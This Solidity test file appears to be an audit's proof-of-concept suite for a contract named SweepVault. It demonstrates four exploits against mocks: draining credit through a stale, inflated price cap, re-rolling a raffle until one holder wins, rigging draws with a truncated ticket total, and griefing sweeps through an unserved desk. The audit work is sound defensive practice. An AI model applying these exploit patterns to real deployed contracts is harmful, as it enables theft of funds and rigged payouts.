// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {SweepBase, MockVenue} from "../../utils/SweepBase.sol";
import {Merkle} from "../../utils/Merkle.sol";
import {Clock} from "../../utils/Clock.sol";
import {SweepVault} from "../../../src/SweepVault.sol";

/// Audit C (treasury, sweeps, roles, deploy). Proof-of-concept tests for the SweepVault findings. Nothing in src/ is changed.
contract C_SweepVaultPoC is SweepBase {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address carol = makeAddr("carol (the grinder)");
    bytes32[] leaves;
    uint256 constant TOTAL = 10; // alice [0,5), bob [5,8), carol [8,10)

    function setUp() public override {
        super.setUp();
        _stockVenue(40);
        leaves.push(raffle.leaf(alice, 0, 5));
        leaves.push(raffle.leaf(bob, 5, 8));
        leaves.push(raffle.leaf(carol, 8, 10));
    }

    /// Both clocks, read through the cheatcodes (under via_ir `block.number` can be cached inside one test function).
    function _skip(uint256 secs) internal {
        vm.warp(vm.getBlockTimestamp() + secs);
        vm.roll(vm.getBlockNumber() + secs / PBS + 1);
    }

    // ------------------------------------------------------------------------------------------------------------------------
    // C-01: the H12 cap ceiling proposed at deploy never takes effect: `acceptCapCeiling` is a separate public call that no
    // script, service, checklist or check makes. Until someone makes it, a stale re-post is unbounded.
    // ------------------------------------------------------------------------------------------------------------------------
    function test_C01_ceilingProposedAtDeployIsNeverActiveWithoutAccept_andStaleRepostIsUnbounded() public {
        // go-live step 7: the Safe proposes a ceiling of 2x the honest cap
        vm.prank(owner);
        raffle.proposeCapCeiling(2 * PRICE);
        // honest operation for more than the 7-day delay
        _postCap(raffle, PRICE);
        Clock.skip(8 days);
        assertEq(raffle.capCeiling(), 0, "nobody called acceptCapCeiling: no ceiling applies");
        assertEq(raffle.pendingCeiling(), 2 * PRICE);

        // the coin has 1 ETH of credit
        _fundCoin(raffle, coinR, routerR, 1 ether);

        // a compromised keeper: the cap is stale (keeper stopped posting / waited an hour), so no step bound applies either
        assertFalse(raffle.capFresh());
        vm.prank(keeper);
        raffle.postCap(1000 * PRICE); // 1000x the market
        // anyone (the attacker) sweeps at 1000x through a route of their choosing (here the mock venue's price stands in for
        // a pool the attacker has pushed up and will sell back into)
        (uint256 spent, uint256 bought) = raffle.sweep(coinR, 1 ether, abi.encodeCall(MockVenue.buy, (1000 * PRICE)), 1);
        assertEq(spent, 1 ether, "the whole credit was spent");
        assertEq(bought, (1 ether * 1e18) / (1000 * PRICE), "for 1/1000 of what it was worth");
        assertEq(raffle.credit(coinR), 0);
    }

    /// C-01 (b): even while fresh, the ±20% / 10-minute step compounds to ~3x in one hour, and the cap stays fresh throughout.
    function test_C01b_freshStepCompoundsToThreeTimesInAnHour() public {
        _postCap(raffle, PRICE);
        uint256 c = PRICE;
        for (uint256 i = 0; i < 6; ++i) {
            _skip(10 minutes);
            c = c + (c * 2_000) / 10_000;
            vm.prank(keeper);
            raffle.postCap(c);
        }
        assertTrue(raffle.capFresh());
        assertGt(raffle.cap(), (PRICE * 29) / 10, "~2.99x the starting cap within the hour");
    }

    // ------------------------------------------------------------------------------------------------------------------------
    // C-02: RAFFLE grinding. Nothing in Phase 1 (keeper service, site, monitor) calls requestDraw/resolve/claim. A ticket
    // holder who reads the pinned round's public drand signature can decline to resolve a losing outcome, wait 24 h and
    // `redraw` a fresh round, until the outcome is theirs.
    // ------------------------------------------------------------------------------------------------------------------------
    /// The drand network's public signature for a round (what anyone can read off api.drand.sh once the round exists).
    function _published(uint64 round) internal pure returns (bytes32) {
        return keccak256(abi.encode("drand evmnet", round));
    }

    function _winnerFor(uint256 id, uint64 round) internal view returns (uint256) {
        return uint256(keccak256(abi.encode(_published(round), address(raffle), id))) % TOTAL;
    }

    function test_C02_aTicketHolderRerollsTheRaffleUntilTheyWin() public {
        _sweepWhole(raffle, coinR, routerR, 1);
        bytes32 root = Merkle.root(leaves);
        vm.prank(keeper);
        uint256 id = raffle.openDraw(coinR, root, TOTAL, "https://keeper/snap", uint64(vm.getBlockTimestamp()), uint64(vm.getBlockNumber()));
        _skip(15 minutes);
        raffle.requestDraw(id); // anyone, e.g. carol

        uint256 cycles;
        while (true) {
            uint64 round = raffle.draw(id).round;
            _skip(beacon.timeOf(round) + 1 - vm.getBlockTimestamp()); // the round now exists at drand: carol reads it off-chain
            uint256 w = _winnerFor(id, round);
            if (w >= 8) break; // carol's range [8,10)
            // not carol: she does not resolve; nobody else does (no service or UI calls resolve). A day later she re-rolls.
            _skip(24 hours);
            raffle.redraw(id);
            cycles++;
            require(cycles < 64, "grind bound");
        }
        // carol's outcome: now she proves it and claims
        raffle.resolve(id, abi.encodePacked(_published(raffle.draw(id).round)));
        uint256 wt = raffle.draw(id).winningTicket;
        assertGe(wt, 8);
        raffle.claim(id, carol, 8, 10, Merkle.proof(leaves, 2));
        assertEq(wrapper.balanceOf(carol), ONE, "a 20% holder took the prize");
        emit log_named_uint("redraw cycles needed (24h each)", cycles);
    }

    // ------------------------------------------------------------------------------------------------------------------------
    // C-03: `totalTickets` is a separate argument, not committed in the root. A keeper can publish the CORRECT root and file
    // (so a verifier that recomputes and compares only the root passes) with a smaller totalTickets, so only the lowest
    // ranges (holders ordered by address) can ever win.
    // ------------------------------------------------------------------------------------------------------------------------
    function test_C03_correctRootWithTruncatedTotalTicketsHandsTheDrawToTheLowestRange() public {
        bytes32 root = Merkle.root(leaves); // the honest root: alice, bob and carol
        for (uint256 k = 0; k < 8; ++k) {
            _sweepWhole(raffle, coinR, routerR, 1);
            vm.prank(keeper);
            uint256 id = raffle.openDraw(coinR, root, 5, "https://keeper/snap", uint64(vm.getBlockTimestamp()), uint64(vm.getBlockNumber()));
            _skip(15 minutes);
            raffle.requestDraw(id);
            raffle.resolve(id, abi.encodePacked(keccak256(abi.encode("round", k))));
            assertLt(raffle.draw(id).winningTicket, 5, "only alice's [0,5) can ever win");
        }
    }

    // ------------------------------------------------------------------------------------------------------------------------
    // C-07: sweepViaDesk griefing. The desk is deployed but unserved in Phase 1. Anyone can park a coin's whole credit there,
    // cap-sized chunk by chunk, blocking every sweep of that coin for the desk's 6 h TTL, and repeat.
    // ------------------------------------------------------------------------------------------------------------------------
    function test_C07_anyoneParksACoinsCreditAtTheUnservedDesk() public {
        _fundCoin(raffle, coinR, routerR, 3 * PRICE);
        _postCap(raffle, PRICE);
        vm.startPrank(stranger);
        uint256 r0 = raffle.sweepViaDesk(coinR, PRICE);
        uint256 r1 = raffle.sweepViaDesk(coinR, PRICE);
        uint256 r2 = raffle.sweepViaDesk(coinR, PRICE);
        vm.stopPrank();
        assertEq(raffle.credit(coinR), 0);
        vm.expectRevert(SweepVault.Insufficient.selector);
        raffle.sweep(coinR, PRICE, abi.encodeCall(MockVenue.buy, (PRICE)), 1);
        // six hours later the griefer collects (anyone may) and parks it again
        Clock.skip(6 hours);
        raffle.collectDesk(r0);
        raffle.collectDesk(r1);
        raffle.collectDesk(r2);
        assertEq(raffle.credit(coinR), 3 * PRICE);
        _postCap(raffle, PRICE);
        vm.prank(stranger);
        raffle.sweepViaDesk(coinR, PRICE);
        assertEq(raffle.credit(coinR), 2 * PRICE);
    }
}
